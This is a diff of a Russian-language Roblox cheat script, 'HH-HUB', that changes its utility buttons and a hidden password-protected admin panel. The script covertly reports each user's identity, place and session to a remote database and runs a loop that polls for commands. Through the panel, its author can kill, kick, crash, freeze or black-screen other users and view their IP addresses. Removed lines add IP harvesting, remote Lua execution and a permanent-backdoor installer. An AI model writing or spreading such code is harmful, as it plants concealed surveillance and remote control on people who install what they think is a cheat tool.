+UtilSect:AddButton("Вылечить", "Восстановить HP", Color3.fromRGB(60, 220, 120), function()
     local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
     if hum then hum.Health = hum.MaxHealth end
 end)
 
-UtilSect1:AddButton("Телепорт в центр", "0, 50, 0", Color3.fromRGB(50, 150, 255), function()
+UtilSect:AddButton("ТП в центр", "0, 50, 0", Color3.fromRGB(50, 150, 255), function()
     local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
     if root then root.CFrame = CFrame.new(0, 50, 0) end
 end)
 
-UtilSect1:AddButton("Телепорт в небо", "Высоко вверх", Color3.fromRGB(100, 200, 255), function()
+UtilSect:AddButton("ТП в небо", "+500 по Y", Color3.fromRGB(100, 200, 255), function()
     local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
     if root then root.CFrame = root.CFrame * CFrame.new(0, 500, 0) end
 end)
 
-UtilSect1:AddButton("Сбросить персонажа", "Перезагрузить", Color3.fromRGB(200, 150, 50), function()
+UtilSect:AddButton("Сбросить персонажа", "Перезагрузить", Color3.fromRGB(200, 150, 50), function()
     local char = LP.Character
     if char then char:BreakJoints() end
 end)
 
-UtilSect1:AddButton("Копировать ID", "В буфер обмена", Color3.fromRGB(150, 150, 150), function()
+UtilSect:AddButton("Копировать ID", "В буфер обмена", Color3.fromRGB(150, 150, 150), function()
     if setclipboard then
         setclipboard(tostring(LP.UserId))
         SG:SetCore("SendNotification", {
@@ -1413,7 +1380,7 @@ UtilSect1:AddButton("Копировать ID", "В буфер обмена", Col
     end
 end)
 
-UtilSect1:AddButton("Перезагрузить игру", "Teleport", Color3.fromRGB(200, 100, 100), function()
+UtilSect:AddButton("Перезагрузить игру", "Teleport", Color3.fromRGB(200, 100, 100), function()
     TPS:Teleport(game.PlaceId, LP)
 end)
 
@@ -1467,22 +1434,22 @@ MiscSect:AddButton("Длинные ноги", "Анимация", Color3.fromRGB
     end
 end)
 
-MiscSect:AddButton("Толстый персонаж", "В ширину", Color3.fromRGB(200, 150, 50), function()
+MiscSect:AddButton("Толстый", "В ширину", Color3.fromRGB(200, 150, 50), function()
     for _, v in ipairs(LP.Character:GetChildren()) do
         if v:IsA("Part") or v:IsA("MeshPart") then
-            TS:Create(v, TweenInfo.new(0.5), { Size = v.Size * 1.5 }):Play()
+            TS:Create(v, TweenInfo.new(0.5), { Size = v.Size * Vector3.new(1.5, 1, 1.5) }):Play()
         end
     end
     task.delay(8, function()
         for _, v in ipairs(LP.Character:GetChildren()) do
             if v:IsA("Part") or v:IsA("MeshPart") then
-                TS:Create(v, TweenInfo.new(0.5), { Size = v.Size / 1.5 }):Play()
+                TS:Create(v, TweenInfo.new(0.5), { Size = v.Size / Vector3.new(1.5, 1, 1.5) }):Play()
             end
         end
     end)
 end)
 
-MiscSect:AddButton("Тонкий персонаж", "В высоту", Color3.fromRGB(50, 150, 200), function()
+MiscSect:AddButton("Тонкий", "В высоту", Color3.fromRGB(50, 150, 200), function()
     for _, v in ipairs(LP.Character:GetChildren()) do
         if v:IsA("Part") or v:IsA("MeshPart") then
             TS:Create(v, TweenInfo.new(0.5), { Size = Vector3.new(v.Size.X * 0.5, v.Size.Y * 1.5, v.Size.Z * 0.5) }):Play()
@@ -1497,9 +1464,17 @@ MiscSect:AddButton("Тонкий персонаж", "В высоту", Color3.fr
     end)
 end)
 
-MiscSect:AddButton("Рандомные эмоции", "Случайные", Color3.fromRGB(255, 100, 150), function()
+MiscSect:AddButton("Изменить цвет", "Случайный цвет", Color3.fromRGB(255, 0, 255), function()
+    for _, v in ipairs(LP.Character:GetChildren()) do
+        if v:IsA("Part") or v:IsA("MeshPart") then
+            v.BrickColor = BrickColor.random()
+        end
+    end
+end)
+
+MiscSect:AddButton("Эмоции", "В чат", Color3.fromRGB(255, 100, 150), function()
     local emotes = {"Laugh", "Dance", "Wave", "Point", "Cheer", "Clap"}
-    for i = 1, 10 do
+    for i = 1, 5 do
         local emote = emotes[math.random(#emotes)]
         SG:SetCore("ChatMakeSystemMessage", {
             Text = "*" .. emote .. "*",
@@ -1509,31 +1484,8 @@ MiscSect:AddButton("Рандомные эмоции", "Случайные", Colo
     end
 end)
 
-MiscSect:AddButton("Спам в чат", "Приветствия", Color3.fromRGB(200, 200, 0), function()
-    for i = 1, 20 do
-        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("Привет от HH-HUB #" .. i, "All")
-        task.wait(0.1)
-    end
-end)
-
-MiscSect:AddButton("Изменить цвет", "Случайный цвет", Color3.fromRGB(255, 0, 255), function()
-    for _, v in ipairs(LP.Character:GetChildren()) do
-        if v:IsA("Part") or v:IsA("MeshPart") then
-            v.BrickColor = BrickColor.random()
-        end
-    end
-end)
-
-MiscSect:AddButton("Войти в админку", "Скрытая панель", Color3.fromRGB(140, 80, 255), function()
-    SG:SetCore("SendNotification", {
-        Title = "Админ-панель",
-        Text = "Нажмите END на клавиатуре",
-        Duration = 3
-    })
-end)
-
 -- ==============================================
--- СКРЫТАЯ АДМИН-ПАНЕЛЬ (ОТКРЫВАЕТСЯ ПО END)
+-- СКРЫТАЯ АДМИН-ПАНЕЛЬ
 -- ==============================================
 local function createAdminPanel()
     if adminPanel then
@@ -1543,7 +1495,7 @@ local function createAdminPanel()
     end
     
     adminPanel = Instance.new("ScreenGui")
-    adminPanel.Name = "HH_AdminPanel"
+    adminPanel.Name = "HH_Admin"
     adminPanel.ResetOnSpawn = false
     adminPanel.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
     
@@ -1565,20 +1517,12 @@ local function createAdminPanel()
     fCorner.CornerRadius = UDim.new(0, 12)
     fCorner.Parent = frame
     
-    local fGradient = Instance.new("UIGradient")
-    fGradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 30, 70)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 25))
-    })
-    fGradient.Rotation = 90
-    fGradient.Parent = frame
-    
     -- Заголовок
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 55)
     title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     title.BackgroundTransparency = 0.3
-    title.Text = "👑 АДМИН-ПАНЕЛЬ • 50+ ФУНКЦИЙ"
+    title.Text = "👑 АДМИН-ПАНЕЛЬ"
     title.TextColor3 = Color3.fromRGB(200, 150, 255)
     title.TextScaled = true
     title.Font = Enum.Font.GothamBold
@@ -1608,28 +1552,16 @@ local function createAdminPanel()
         adminPanel = nil
     end)
     
-    -- Вкладки
-    local tabContainer = Instance.new("Frame")
-    tabContainer.Size = UDim2.new(1, 0, 0, 45)
-    tabContainer.Position = UDim2.new(0, 0, 0, 55)
-    tabContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-    tabContainer.Parent = frame
-    
     -- Контент
     local content = Instance.new("ScrollingFrame")
-    content.Size = UDim2.new(1, -20, 1, -120)
-    content.Position = UDim2.new(0, 10, 0, 110)
+    content.Size = UDim2.new(1, -20, 1, -75)
+    content.Position = UDim2.new(0, 10, 0, 65)
     content.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
     content.BorderSizePixel = 0
     content.ScrollBarThickness = 5
     content.ScrollBarImageColor3 = Color3.fromRGB(140, 80, 255)
-    content.CanvasSize = UDim2.new(0, 0, 0, 0)
     content.AutomaticCanvasSize = Enum.AutomaticSize.Y
     content.Parent = frame
-    
-    local cCorner = Instance.new("UICorner")
-    cCorner.CornerRadius = UDim.new(0, 8)
-    cCorner.Parent = content
     
     local contentLayout = Instance.new("UIListLayout")
     contentLayout.Padding = UDim.new(0, 10)
@@ -1641,7 +1573,7 @@ local function createAdminPanel()
     searchBox.Size = UDim2.new(1, -20, 0, 40)
     searchBox.Position = UDim2.new(0, 10, 0, 5)
     searchBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-    searchBox.PlaceholderText = "🔍 Поиск игрока по имени или ID..."
+    searchBox.PlaceholderText = "🔍 Поиск..."
     searchBox.Text = ""
     searchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
     searchBox.TextScaled = true
@@ -1664,7 +1596,7 @@ local function createAdminPanel()
     statsCorner.Parent = statsFrame
     
     local totalLabel = Instance.new("TextLabel")
-    totalLabel.Size = UDim2.new(0.33, 0, 1, 0)
+    totalLabel.Size = UDim2.new(0.34, 0, 1, 0)
     totalLabel.BackgroundTransparency = 1
     totalLabel.Text = "Всего: 0"
     totalLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
@@ -1673,8 +1605,8 @@ local function createAdminPanel()
     totalLabel.Parent = statsFrame
     
     local sameLabel = Instance.new("TextLabel")
-    sameLabel.Size = UDim2.new(0.34, 0, 1, 0)
-    sameLabel.Position = UDim2.new(0.33, 0, 0, 0)
+    sameLabel.Size = UDim2.new(0.33, 0, 1, 0)
+    sameLabel.Position = UDim2.new(0.34, 0, 0, 0)
     sameLabel.BackgroundTransparency = 1
     sameLabel.Text = "В сервере: 0"
     sameLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
@@ -1692,10 +1624,8 @@ local function createAdminPanel()
     backdoorLabel.Font = Enum.Font.GothamBold
     backdoorLabel.Parent = statsFrame
     
-    -- Функция добавления игрока
+    -- Функция добавления карточки игрока
     local function addPlayerCard(uid, info)
-        if not info then return end
-        
         local card = Instance.new("Frame")
         card.Size = UDim2.new(1, -20, 0, 200)
         card.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
@@ -1721,7 +1651,7 @@ local function createAdminPanel()
         nameLabel.Size = UDim2.new(0.5, 0, 0, 25)
         nameLabel.Position = UDim2.new(0, 35, 0, 8)
         nameLabel.BackgroundTransparency = 1
-        nameLabel.Text = info.name .. (info.hasBackdoor and " [БЕКДОР]" or "")
+        nameLabel.Text = info.name .. (info.hasBackdoor and " [Б]" or "")
         nameLabel.TextColor3 = info.hasBackdoor and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 255, 255)
         nameLabel.TextScaled = true
         nameLabel.Font = Enum.Font.GothamBold
@@ -1733,7 +1663,7 @@ local function createAdminPanel()
         idLabel.Size = UDim2.new(0.5, 0, 0, 20)
         idLabel.Position = UDim2.new(0.5, 0, 0, 10)
         idLabel.BackgroundTransparency = 1
-        idLabel.Text = "ID: " .. uid
+        idLabel.Text = "ID: " .. uid:sub(1, 8) .. "..."
         idLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
         idLabel.TextScaled = true
         idLabel.Font = Enum.Font.Gotham
@@ -1745,32 +1675,19 @@ local function createAdminPanel()
         placeLabel.Size = UDim2.new(0.5, 0, 0, 20)
         placeLabel.Position = UDim2.new(0, 35, 0, 33)
         placeLabel.BackgroundTransparency = 1
-        placeLabel.Text = "📍 Place: " .. tostring(info.place)
+        placeLabel.Text = "📍 Place: " .. tostring(info.place):sub(1, 8)
         placeLabel.TextColor3 = info.same and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 255, 100)
         placeLabel.TextScaled = true
         placeLabel.Font = Enum.Font.Gotham
         placeLabel.TextXAlignment = Enum.TextXAlignment.Left
         placeLabel.Parent = card
         
-        -- Job ID
-        local jobLabel = Instance.new("TextLabel")
-        jobLabel.Size = UDim2.new(0.5, 0, 0, 20)
-        jobLabel.Position = UDim2.new(0.5, 0, 0, 33)
-        jobLabel.BackgroundTransparency = 1
-        jobLabel.Text = "🎮 Job: " .. (info.job or "N/A")
-        jobLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
-        jobLabel.TextScaled = true
-        jobLabel.Font = Enum.Font.Gotham
-        jobLabel.TextXAlignment = Enum.TextXAlignment.Left
-        jobLabel.Parent = card
-        
         -- IP
         local ipLabel = Instance.new("TextLabel")
         ipLabel.Size = UDim2.new(0.5, 0, 0, 20)
         ipLabel.Position = UDim2.new(0, 35, 0, 53)
         ipLabel.BackgroundTransparency = 1
-        local ipData = dbGet("ip_" .. uid)
-        ipLabel.Text = "🌐 IP: " .. (ipData or "Unknown")
+        ipLabel.Text = "🌐 IP: " .. (info.ip or "Unknown")
         ipLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
         ipLabel.TextScaled = true
         ipLabel.Font = Enum.Font.Gotham
@@ -1789,9 +1706,9 @@ local function createAdminPanel()
         timeLabel.TextXAlignment = Enum.TextXAlignment.Left
         timeLabel.Parent = card
         
-        -- Контейнер для кнопок (4 ряда по 13 кнопок = 52 функции)
+        -- Контейнер для кнопок
         local btnContainer = Instance.new("Frame")
-        btnContainer.Size = UDim2.new(1, -20, 0, 120)
+        btnContainer.Size = UDim2.new(1, -20, 0, 90)
         btnContainer.Position = UDim2.new(0, 10, 0, 80)
         btnContainer.BackgroundTransparency = 1
         btnContainer.Parent = card
@@ -1800,10 +1717,7 @@ local function createAdminPanel()
         grid.CellSize = UDim2.new(0, 75, 0, 28)
         grid.CellPadding = UDim2.new(0, 3, 0, 3)
         grid.FillDirection = Enum.FillDirection.Horizontal
-        grid.HorizontalAlignment = Enum.HorizontalAlignment.Left
         grid.Parent = btnContainer
-        
-        local targetPlayer = Players:GetPlayerByUserId(tonumber(uid))
         
         -- Функция создания кнопки
         local function addBtn(text, color, callback)
@@ -1823,233 +1737,82 @@ local function createAdminPanel()
             btn.MouseButton1Click:Connect(callback)
         end
         
-        -- 1-10: Основные команды
+        -- Кнопки
         addBtn("💀 Kill", Color3.fromRGB(220, 60, 60), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|KILL_PLAYER||" .. tick(), 30)
+            sendBackdoorCommand(uid, "KILL_PLAYER", "")
         end)
         
         addBtn("🔄 Loop", Color3.fromRGB(220, 120, 60), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|START_KILL_LOOP||" .. tick(), 30)
+            sendBackdoorCommand(uid, "START_KILL_LOOP", "")
         end)
         
         addBtn("⏹️ Stop", Color3.fromRGB(100, 100, 100), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|STOP_KILL_LOOP||" .. tick(), 30)
+            sendBackdoorCommand(uid, "STOP_KILL_LOOP", "")
         end)
         
         addBtn("❄️ Freeze", Color3.fromRGB(60, 120, 220), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|FREEZE_PLAYER||" .. tick(), 30)
+            sendBackdoorCommand(uid, "FREEZE_PLAYER", "")
         end)
         
         addBtn("🔥 Unfreeze", Color3.fromRGB(220, 160, 60), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|UNFREEZE_PLAYER||" .. tick(), 30)
+            sendBackdoorCommand(uid, "UNFREEZE_PLAYER", "")
         end)
         
         addBtn("👢 Kick", Color3.fromRGB(200, 80, 80), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|KICK_PLAYER|Вы кикнуты администратором|" .. tick(), 30)
-        end)
-        
-        addBtn("📝 Kick+", Color3.fromRGB(200, 80, 80), function()
-            local reason = "Нарушение правил"
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|KICK_PLAYER|" .. reason .. "|" .. tick(), 30)
+            sendBackdoorCommand(uid, "KICK_PLAYER", "Вы кикнуты")
         end)
         
         addBtn("👁️ Watch", Color3.fromRGB(140, 80, 255), function()
-            if targetPlayer then
-                Camera.CameraSubject = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character
+            local target = Players:GetPlayerByUserId(tonumber(uid))
+            if target then
+                Camera.CameraSubject = target.Character and target.Character:FindFirstChild("HumanoidRootPart") or target.Character
             end
         end)
         
         addBtn("📍 TP to", Color3.fromRGB(60, 180, 140), function()
-            if targetPlayer and targetPlayer.Character then
-                local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
-                local tRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-                if root and tRoot then
+            local target = Players:GetPlayerByUserId(tonumber(uid))
+            local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+            if target and target.Character and root then
+                local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
+                if tRoot then
                     root.CFrame = tRoot.CFrame * CFrame.new(0, 3, 5)
                 end
             end
         end)
         
         addBtn("📦 Bring", Color3.fromRGB(100, 200, 80), function()
-            if targetPlayer and targetPlayer.Character then
-                local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
-                local tRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-                if root and tRoot then
+            local target = Players:GetPlayerByUserId(tonumber(uid))
+            local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+            if target and target.Character and root then
+                local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
+                if tRoot then
                     tRoot.CFrame = root.CFrame * CFrame.new(0, 0, -5)
                 end
             end
         end)
         
-        -- 11-20: Отключение функций
-        addBtn("🚫 God", Color3.fromRGB(160, 80, 160), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|GODMODE|" .. tick(), 30)
-        end)
-        
-        addBtn("🚫 Flight", Color3.fromRGB(80, 120, 200), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|FLIGHT|" .. tick(), 30)
-        end)
-        
-        addBtn("🚫 Noclip", Color3.fromRGB(140, 80, 140), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|NOCLIP|" .. tick(), 30)
-        end)
-        
-        addBtn("🚫 ESP", Color3.fromRGB(200, 80, 120), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|ESP|" .. tick(), 30)
-        end)
-        
-        addBtn("🚫 XRay", Color3.fromRGB(140, 100, 220), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|XRAY|" .. tick(), 30)
-        end)
-        
-        addBtn("🚫 Aimbot", Color3.fromRGB(200, 80, 160), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|AIMBOT|" .. tick(), 30)
-        end)
-        
-        addBtn("🚫 Trigger", Color3.fromRGB(200, 120, 80), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|TRIGGERBOT|" .. tick(), 30)
-        end)
-        
-        addBtn("🚫 InfJump", Color3.fromRGB(100, 200, 100), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|INFJUMP|" .. tick(), 30)
-        end)
-        
-        addBtn("🚫 AntiAFK", Color3.fromRGB(200, 200, 80), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|ANTIAFK|" .. tick(), 30)
-        end)
-        
-        addBtn("🚫 NoFall", Color3.fromRGB(100, 160, 200), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|NOFALL|" .. tick(), 30)
-        end)
-        
-        -- 21-30: Скорость
-        addBtn("🐢 Speed 1", Color3.fromRGB(100, 140, 200), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_WALKSPEED|1|" .. tick(), 30)
-        end)
-        
-        addBtn("⚡ Speed 16", Color3.fromRGB(100, 200, 100), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_WALKSPEED|16|" .. tick(), 30)
+        addBtn("⚡ Speed 1", Color3.fromRGB(100, 140, 200), function()
+            sendBackdoorCommand(uid, "SET_WALKSPEED", "1")
         end)
         
         addBtn("🚀 Speed 100", Color3.fromRGB(200, 200, 60), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_WALKSPEED|100|" .. tick(), 30)
+            sendBackdoorCommand(uid, "SET_WALKSPEED", "100")
         end)
         
-        addBtn("🐢 Jump 1", Color3.fromRGB(100, 140, 200), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_JUMPPOWER|1|" .. tick(), 30)
-        end)
-        
-        addBtn("⚡ Jump 50", Color3.fromRGB(100, 200, 100), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_JUMPPOWER|50|" .. tick(), 30)
-        end)
-        
-        addBtn("🚀 Jump 200", Color3.fromRGB(200, 200, 60), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_JUMPPOWER|200|" .. tick(), 30)
-        end)
-        
-        -- 31-40: Деструктивные
         addBtn("💥 Crash", Color3.fromRGB(200, 50, 50), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|CRASH_PLAYER||" .. tick(), 30)
+            sendBackdoorCommand(uid, "CRASH_PLAYER", "")
         end)
         
         addBtn("⬛ Black", Color3.fromRGB(50, 50, 50), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|BLACK_SCREEN||" .. tick(), 30)
+            sendBackdoorCommand(uid, "BLACK_SCREEN", "")
         end)
         
         addBtn("⚡ Flash", Color3.fromRGB(255, 255, 0), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|FLASH_SCREEN||" .. tick(), 30)
+            sendBackdoorCommand(uid, "FLASH_SCREEN", "")
         end)
         
         addBtn("🌀 Shake", Color3.fromRGB(150, 150, 150), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SHAKE_CAMERA||" .. tick(), 30)
-        end)
-        
-        addBtn("🔄 Invert", Color3.fromRGB(100, 200, 200), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|INVERT_CONTROLS||" .. tick(), 30)
-        end)
-        
-        addBtn("📢 Spam", Color3.fromRGB(255, 100, 100), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SPAM_NOTIFICATIONS||" .. tick(), 30)
-        end)
-        
-        addBtn("🔇 Mute", Color3.fromRGB(100, 100, 100), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|MUTE_GAME||" .. tick(), 30)
-        end)
-        
-        addBtn("🔊 Unmute", Color3.fromRGB(100, 200, 100), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|UNMUTE_GAME||" .. tick(), 30)
-        end)
-        
-        addBtn("🔄 Reload", Color3.fromRGB(200, 150, 50), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|RELOAD_GAME||" .. tick(), 30)
-        end)
-        
-        addBtn("🚪 Leave", Color3.fromRGB(200, 50, 50), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|LEAVE_GAME||" .. tick(), 30)
-        end)
-        
-        -- 41-50: Информационные
-        addBtn("📦 Inv", Color3.fromRGB(100, 200, 100), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|GET_INVENTORY||" .. tick(), 30)
-        end)
-        
-        addBtn("👥 Friends", Color3.fromRGB(150, 100, 255), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|GET_FRIENDS||" .. tick(), 30)
-        end)
-        
-        addBtn("📍 Loc", Color3.fromRGB(100, 150, 255), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|GET_LOCATION||" .. tick(), 30)
-        end)
-        
-        addBtn("🌐 Get IP", Color3.fromRGB(150, 100, 200), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|GET_IP||" .. tick(), 30)
-        end)
-        
-        addBtn("📊 Data", Color3.fromRGB(200, 150, 100), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|GET_PLAYER_DATA||" .. tick(), 30)
-        end)
-        
-        addBtn("📋 Copy ID", Color3.fromRGB(150, 150, 150), function()
-            if setclipboard then
-                setclipboard(uid)
-                SG:SetCore("SendNotification", {
-                    Title = "Скопировано",
-                    Text = "ID: " .. uid,
-                    Duration = 2
-                })
-            end
-        end)
-        
-        addBtn("📋 Copy IP", Color3.fromRGB(150, 150, 255), function()
-            if setclipboard then
-                local ipData = dbGet("ip_" .. uid)
-                setclipboard(ipData or "Unknown")
-                SG:SetCore("SendNotification", {
-                    Title = "Скопировано",
-                    Text = "IP: " .. (ipData or "Unknown"),
-                    Duration = 2
-                })
-            end
-        end)
-        
-        addBtn("⚖️ Grav", Color3.fromRGB(100, 100, 200), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_GRAVITY|50|" .. tick(), 30)
-        end)
-        
-        addBtn("📨 Notify", Color3.fromRGB(150, 150, 255), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|NOTIFICATION|Привет от админа!|" .. tick(), 30)
-        end)
-        
-        addBtn("🎁 Give", Color3.fromRGB(200, 200, 50), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|GIVE_ITEM|Сундук|" .. tick(), 30)
-        end)
-        
-        -- 51-52: Экстра
-        addBtn("📋 Exec", Color3.fromRGB(100, 100, 255), function()
-            local code = "print('Hello from admin')"
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|EXECUTE_LUA|" .. code .. "|" .. tick(), 30)
-        end)
-        
-        addBtn("🔄 Reset", Color3.fromRGB(200, 100, 100), function()
-            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|RELOAD_GAME||" .. tick(), 30)
+            sendBackdoorCommand(uid, "SHAKE_CAMERA", "")
         end)
     end
     
@@ -2068,9 +1831,7 @@ local function createAdminPanel()
         
         for uid, info in pairs(Registry) do
             if uid ~= tostring(LP.UserId) then
-                if searchText == "" or 
-                   info.name:lower():find(searchText) or 
-                   uid:find(searchText) then
+                if searchText == "" or info.name:lower():find(searchText) then
                     addPlayerCard(uid, info)
                 end
                 
@@ -2086,6 +1847,7 @@ local function createAdminPanel()
     end
     
     searchBox:GetPropertyChangedSignal("Text"):Connect(refreshList)
+    refreshList()
     
     -- Автообновление
     task.spawn(function()
@@ -2094,111 +1856,23 @@ local function createAdminPanel()
             pcall(refreshList)
         end
     end)
-    
-    refreshList()
 end
 
 -- ==============================================
--- БЕКДОР ФУНКЦИИ
--- ==============================================
-local function savePlayerData()
-    local data = HS:JSONEncode({
-        name = LP.Name,
-        display = LP.DisplayName,
-        id = LP.UserId,
-        place = game.PlaceId,
-        job = game.JobId,
-        time = tick(),
-        accountAge = LP.AccountAge
-    })
-    dbSet(MY_DATA_KEY, data, DB_TTL)
-end
-
-local function updatePresence()
-    local data = table.concat({
-        LP.DisplayName,
-        LP.Name,
-        game.PlaceId,
-        game.JobId:sub(1, 8),
-        tick(),
-        LP.UserId,
-        "true"
-    }, "§")
-    dbSet(MY_KEY, data, DB_TTL)
-end
-
-local function fetchUsers()
-    if not isAdmin then return end
-    
-    local ok, data = pcall(function()
-        return HS:GetAsync(DB_BASE .. "?prefix=presence_&format=keys", true)
-    end)
-    if not ok then return end
-    
-    local newReg = {}
-    for key in data:gmatch("[^\n]+") do
-        if key:sub(1, 9) == "presence_" then
-            local uid = key:sub(10)
-            local raw = dbGet(key)
-            if raw then
-                local parts = raw:split("§")
-                if #parts >= 6 then
-                    newReg[uid] = {
-                        name = parts[1],
-                        display = parts[2],
-                        place = parts[3],
-                        job = parts[4],
-                        time = tonumber(parts[5]) or 0,
-                        same = (parts[4] == game.JobId:sub(1, 8)),
-                        hasBackdoor = parts[7] == "true"
-                    }
-                end
-            end
-        end
-    end
-    Registry = newReg
-end
-
--- ==============================================
--- УСТАНОВКА АВТОНОМНОГО БЕКДОРА
--- ==============================================
-local function installPermanentBackdoor()
-    pcall(function()
-        local starterGui = game:GetService("StarterGui")
-        
-        local old = starterGui:FindFirstChild("HH_BackdoorCore")
-        if old then old:Destroy() end
-        
-        local backdoorScript = Instance.new("LocalScript")
-        backdoorScript.Name = "HH_BackdoorCore"
-        backdoorScript.Parent = starterGui
-        
-        -- Здесь должен быть код из второго файла
-        -- Из-за ограничения длины, вставьте сюда полный код из secret_HH-HUB.lua
-        backdoorScript.Source = [[
-            -- Вставьте сюда полный код бекдора
-        ]]
-    end)
-end
-
--- ==============================================
--- ЗАПУСК БЕКДОРА
+-- БЕКДОР В ФОНЕ
 -- ==============================================
 task.spawn(function()
     LP:SetAttribute(NET_FLAG, "1")
-    LP:SetAttribute(BACKDOOR_FLAG, "1")
-    savePlayerData()
-    installPermanentBackdoor()
     
     while true do
         pcall(updatePresence)
-        task.wait(HEARTBEAT)
+        task.wait(15)
     end
 end)
 
 task.spawn(function()
     while true do
-        task.wait(POLL_RATE)
+        task.wait(5)
         pcall(fetchUsers)
     end
 end)
@@ -2226,8 +1900,8 @@ UIS.InputBegan:Connect(function(input, gp)
         if ESP.active then disableESP() else enableESP() end
         
     elseif input.KeyCode == Enum.KeyCode.End then
+        -- Скрытый вход в админку
         if not isAdmin then
-            -- Запрос пароля
             local passGui = Instance.new("ScreenGui")
             passGui.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
             
@@ -2245,70 +1919,42 @@ UIS.InputBegan:Connect(function(input, gp)
             pTitle.Size = UDim2.new(1, 0, 0, 40)
             pTitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
             pTitle.BackgroundTransparency = 0.3
-            pTitle.Text = "🔐 АДМИН-ПАНЕЛЬ"
+            pTitle.Text = "🔐 Вход"
             pTitle.TextColor3 = Color3.fromRGB(200, 150, 255)
             pTitle.TextScaled = true
             pTitle.Font = Enum.Font.GothamBold
             pTitle.Parent = passFrame
             
-            local pTitleCorner = Instance.new("UICorner")
-            pTitleCorner.CornerRadius = UDim.new(0, 10)
-            pTitleCorner.Parent = pTitle
-            
             local box = Instance.new("TextBox")
             box.Size = UDim2.new(0.8, 0, 0, 35)
             box.Position = UDim2.new(0.1, 0, 0.4, 0)
             box.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-            box.PlaceholderText = "Введите пароль"
+            box.PlaceholderText = "Пароль"
             box.Text = ""
             box.TextColor3 = Color3.fromRGB(255, 255, 255)
             box.TextScaled = true
